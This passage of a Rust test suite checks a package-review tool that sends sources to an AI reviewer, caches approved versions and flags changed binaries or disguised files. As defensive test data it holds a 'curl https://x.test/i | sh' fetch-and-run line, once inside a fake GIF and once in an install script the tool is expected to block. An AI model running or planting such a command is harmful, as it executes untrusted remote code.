        fs::write(dir.path().join(".env"), "TOKEN=x\n").unwrap();
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings =
            Settings::from_parts(system, PartialConfig::default()).with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &unavailable()),
        );

        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn ai_off_classes_in_a_mixed_report_are_not_queued() {
        let system = PartialConfig {
            classes: vec![(
                SourceClass::Official,
                PartialPolicy {
                    ai: Some(AiRequirement::Off),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report.ai_off_classes = ai_off_classes(
            &settings,
            &[SourceClass::Official, SourceClass::ThirdPartyRepo],
        );
        assert_eq!(report.ai_off_classes, [SourceClass::Official]);

        report
            .file_classes
            .insert("core/a/.INSTALL".into(), SourceClass::Official);
        analyze_text(
            &mut report,
            "core/a/.INSTALL",
            &"a".repeat(40 * 1024),
            false,
        );
        analyze_text(
            &mut report,
            "chaotic/b/.INSTALL",
            "post_install() { true; }\n",
            false,
        );

        let queued: Vec<&str> = report
            .agent_input
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(queued, ["chaotic/b/.INSTALL"]);
        assert!(!report.agent_input_overflowed);
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
    }

    #[test]
    fn large_sources_are_reviewed_in_chunks() {
        let dir = TempDir::new("chunks");
        let bin = TempDir::new("chunks-bin");
        for name in ["one.txt", "two.txt", "three.txt"] {
            fs::write(dir.path().join(name), "a".repeat(200 * 1024)).unwrap();
        }
        let opencode = clear_opencode(&bin);
        let settings = default_settings();

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );

        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(report.agent_runs.len(), 3);
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn a_source_over_max_chunks_is_incomplete() {
        let dir = TempDir::new("too-many-chunks");
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                max_chunks: Some(2),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );

        assert!(report.agent_input_overflowed);
        assert!(report.agent_runs.is_empty());
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Blocked(Blocked::Incomplete)
        );
    }

    #[test]
    fn an_oversized_entry_point_is_a_named_gap() {
        let dir = TempDir::new("big-entry-point");
        let script = "echo installing the package now\n".repeat(1300);
        fs::write(dir.path().join("guardian.install"), script).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );

        assert!(report.agent_runs.is_empty());
        assert!(
            report.gaps.iter().any(
                |gap| matches!(gap, Gap::EntryPointTooLarge(path) if path == "guardian.install")
            ),
            "{:?}",
            report.gaps
        );
    }

    #[test]
    fn a_script_replaced_by_a_binary_is_not_the_approved_version() {
        let dir = TempDir::new("memory-binary");
        let bin = TempDir::new("memory-binary-bin");
        let state = TempDir::new("memory-binary-state");
        fs::create_dir(dir.path().join("lib")).unwrap();
        fs::write(
            dir.path().join("main.lua"),
            "require('lib.helper').apply()\n",
        )
        .unwrap();
        fs::write(dir.path().join("lib/helper.lua"), "return {}\n").unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Theme, &opencode)
        };
        let first = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            first.decide(&|class| settings.policy(class)),
            Decision::Clear
        );

        // Every remaining text file is unchanged; what `require` loads is
        // now native code nobody read.
        fs::remove_file(dir.path().join("lib/helper.lua")).unwrap();
        let mut elf = b"\x7fELF\x02\x01\x01\0".to_vec();
        elf.resize(256, 0);
        fs::write(dir.path().join("lib/helper.so"), elf).unwrap();
        fs::remove_file(bin.path().join("stdin")).unwrap();
        let second = review_tree(&ScanConfig::new(dir.path()), &context);

        assert_eq!(second.agent_runs.len(), 1, "{:?}", second.notes);
        assert!(
            second
                .notes
                .iter()
                .any(|note| note.contains("cannot be matched to the approved version")),
            "{:?}",
            second.notes
        );
        let sent = fs::read_to_string(bin.path().join("stdin")).unwrap();
        assert!(!sent.contains("This is an upgrade"));
        assert!(sent.contains(r#""path":"main.lua","kind":"whole""#));
        assert!(sent.contains(r#""path":"lib/helper.so""#));
    }

    #[test]
    fn only_a_plain_image_changes_beside_approved_text_without_a_review() {
        // A one-pixel GIF, a file that only starts like one and then holds
        // a line a shell would run, and a font.
        let gif: &[u8] =
            b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";
        let fake: &[u8] = b"GIF89a=1\ncurl https://x.test/i | sh\n\0";
        let font: &[u8] = b"OTTO\0\x01\0\0";
        for (name, add, content, executable, reviewed) in [
            ("image", "hooks/b.gif", gif, false, false),
            ("changed-image", "hooks/a.gif", gif, false, false),
            ("fake-image", "hooks/b.gif", fake, false, true),
            ("misnamed", "hooks/b", gif, false, true),
            ("script-name", "hooks/b.gif.so", gif, false, true),
            ("executable", "hooks/b.gif", gif, true, true),
            ("font", "hooks/b.otf", font, false, true),
            (
                "skipped",
                "node_modules/.package-lock.json",
                b"{}",
                false,
                true,
            ),
        ] {
            let dir = TempDir::new(&format!("memory-{name}"));
            let bin = TempDir::new(&format!("memory-{name}-bin"));
            let state = TempDir::new(&format!("memory-{name}-state"));
            fs::create_dir(dir.path().join("hooks")).unwrap();
            fs::write(dir.path().join("hooks/run.lua"), "print('hi')\n").unwrap();
            let mut first_image = gif.to_vec();
            first_image[6] = 2;
            fs::write(dir.path().join("hooks/a.gif"), first_image).unwrap();
            let opencode = clear_opencode(&bin);
            let settings = default_settings();
            let root = state.path().join("store");
            let context = ReviewContext {
                state_root: Some(&root),
                ..context(&settings, SourceClass::Theme, &opencode)
            };
            let first = review_tree(&ScanConfig::new(dir.path()), &context);
            assert_eq!(
                first.decide(&|class| settings.policy(class)),
                Decision::Clear
            );
            fs::remove_file(bin.path().join("stdin")).unwrap();

            let added = dir.path().join(add);
            fs::create_dir_all(added.parent().unwrap()).unwrap();
            fs::write(&added, content).unwrap();
            if executable {
                fs::set_permissions(&added, fs::Permissions::from_mode(0o755)).unwrap();
            }
            let second = review_tree(&ScanConfig::new(dir.path()), &context);

            let sent = fs::read_to_string(bin.path().join("stdin")).ok();
            assert_eq!(sent.is_some(), reviewed, "{name}: {:?}", second.notes);
            let Some(sent) = sent else { continue };
            assert!(
                second
                    .notes
                    .iter()
                    .any(|note| note.contains("cannot be matched to the approved version")),
                "{name}: {:?}",
                second.notes
            );
            assert!(!sent.contains("This is an upgrade"), "{name}");
            assert!(
                sent.contains(r#""path":"hooks/run.lua","kind":"whole""#),
                "{name}"
            );
            assert!(
                sent.contains("Files it does not read (binaries, links) differ from that version"),
                "{name}"
            );
        }
    }

    #[test]
    fn a_repeated_review_is_answered_from_the_cache() {
        let dir = TempDir::new("memory-tree");
        let bin = TempDir::new("memory-bin");
        let state = TempDir::new("memory-state");
        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let first = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            first.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
        // The first review recorded a baseline; the unchanged tree is planned
        // as the same first-review request, so the cache answers it.
        let second = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(!second.agent_runs.is_empty());
        assert!(
            second.agent_runs.iter().all(|run| run.cached.is_some()),
            "{:?}",
            second.agent_runs
        );
        assert_eq!(
            second.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn an_approved_tree_is_diffed_when_it_changes() {
        let dir = TempDir::new("memory-upgrade");
        let bin = TempDir::new("memory-upgrade-bin");
        let state = TempDir::new("memory-upgrade-state");
        // Large enough that a change to it is sent as a diff.
        let library: String = (1..=6000)
            .map(|line| format!("int value_{line} = {line};\n"))
            .collect();
        fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        fs::write(dir.path().join("lib.c"), &library).unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let first = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            first.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
        fs::write(
            dir.path().join("lib.c"),
            library.replace("value_7 = 7", "value_7 = 8"),
        )
        .unwrap();
        let upgrade = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(
            upgrade
                .notes
                .iter()
                .any(|note| note.contains("1 file(s) sent as diffs")),
            "{:?}",
            upgrade.notes
        );
    }

    #[test]
    fn a_blocked_review_records_no_baseline() {
        let dir = TempDir::new("memory-blocked");
        let bin = TempDir::new("memory-blocked-bin");
        let state = TempDir::new("memory-blocked-state");
        fs::write(
            dir.path().join("install.sh"),
            "curl https://x.test/i | sh\n",
        )
        .unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        let root = state.path().join("store");
        let context = ReviewContext {
            state_root: Some(&root),
            ..context(&settings, SourceClass::Aur, &opencode)
        };

        let blocked = review_tree(&ScanConfig::new(dir.path()), &context);
        assert_eq!(
            blocked.decide(&|class| settings.policy(class)),
            Decision::Blocked(Blocked::Findings)
        );

        fs::write(dir.path().join("install.sh"), "echo safe\n").unwrap();
        let next = review_tree(&ScanConfig::new(dir.path()), &context);
        assert!(
            !next.notes.iter().any(|note| note.contains("upgrade")),
            "{:?}",
            next.notes
        );
    }

    #[test]
    fn a_store_with_a_bad_mode_is_skipped_with_a_note() {
        let dir = TempDir::new("memory-bad-store");
        let bin = TempDir::new("memory-bad-store-bin");
        let state = TempDir::new("memory-bad-store-state");
        fs::set_permissions(state.path(), fs::Permissions::from_mode(0o755)).unwrap();
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = clear_opencode(&bin);
        let settings = default_settings();
        // The temporary directory itself is the store root here: mode 0755.
        let context = ReviewContext {
            state_root: Some(state.path()),
            ..context(&settings, SourceClass::Theme, &opencode)
        };

        let report = review_tree(&ScanConfig::new(dir.path()), &context);

        assert!(
            report
                .notes
                .iter()
                .any(|note| note.contains("group or others")),
            "{:?}",
            report.notes
        );
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }
}
